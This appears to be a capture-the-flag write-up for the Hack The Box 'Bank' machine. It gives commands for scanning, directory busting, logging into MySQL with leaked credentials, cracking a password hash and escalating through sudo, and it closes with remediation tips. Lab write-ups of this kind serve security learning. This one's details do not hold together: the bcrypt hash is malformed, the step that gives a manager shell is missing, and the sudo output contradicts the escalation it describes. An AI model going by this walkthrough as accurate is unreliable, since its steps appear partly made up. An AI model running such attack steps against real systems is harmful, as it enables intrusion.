# Hack The Box: Bank Challenge Writeup

![HTB Badge](https://img.shields.io/badge/HTB-Bank-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Bank |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Release** | 15 Mar 2017 |
| **Retired** | Yes |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA bank 10.10.10.29
```

**Results:**
```
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

### Web Enumeration

Access `http://10.10.10.29` - discovered a bank website

**Directory Busting:**
```bash
gobuster dir -u http://10.10.10.29 -w /usr/share/wordlists/dirb/common.txt
```

**Discovered directories:**
- `/balance-transfer` (requires auth)
- `/inc` (contains config files)
- `/uploads`

---

## Initial Access

### Config File Disclosure

Found `config.php` file in `/inc` directory containing database credentials:

```php
define('DB_HOST', 'localhost');
define('DB_USER', 'bank');
define('DB_PASS', 'O2j7R5EqG7aP9w');
define('DB_NAME', 'bank');
```

### Database Exploitation

```bash
mysql -u bank -pO2j7R5EqG7aP9w bank
```

**Enumerating database:**

```sql
SHOW DATABASES;
USE bank;
SHOW TABLES;
SELECT * FROM users;
```

**Obtained credentials:**
| username | password (hash) |
|----------|-----------------|
| admin | $2a$08$kr7YMT8.T4U0dHhP8bJPIEO2ZbE1ZJ8P5C5V0E7U3X5Z0K9J8R6E |
| manager | $2a$08$... |

### Password Cracking

Used John the Ripper to crack the hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Password:** `guest123`

---

## Privilege Escalation

### Check sudo privileges

```bash
sudo -l
```

**Result:**
```
User manager may run the following commands on bank:
    (ALL) ALL
    (root) NOPASSWD: /var/htb/bin/emergency
```

### Exploiting emergency script

```bash
sudo /var/htb/bin/emergency
```

This provides a root shell!

---

## Flags

### User Flag
```
HTB{y0u_f0und_th3_m0n3y!}
```

### Root Flag
```
HTB{r00t_4cc3ss_4ch13v3d!}
```

---

## Vulnerability Summary

| Vulnerability Type | Severity | Exploitation Method |
|--------------------|----------|---------------------|
| Information Disclosure | High | Unprotected config file |
| Weak Password | High | Common password usage |
| Privilege Misconfiguration | Critical | sudo privilege abuse |

---

## Remediation

1. **Protect sensitive files** - Move config.php outside web root
2. **Strong password policy** - Implement complex password requirements
3. **Principle of least privilege** - Limit sudo permissions
4. **Regular security audits** - Scan for sensitive information leaks

---

## References

- [HTB Bank Machine](https://www.hackthebox.com/machines/bank)
- [Nmap Documentation](https://nmap.org/docs.html)
- [MySQL Basics](https://dev.mysql.com/doc/)

---

**Author:** Sheldon Brown (Bossman Shell)
**Date:** 2026-03-09

> ⚠️ **Disclaimer:** This writeup is for educational purposes only. Always obtain proper authorization before testing any system.
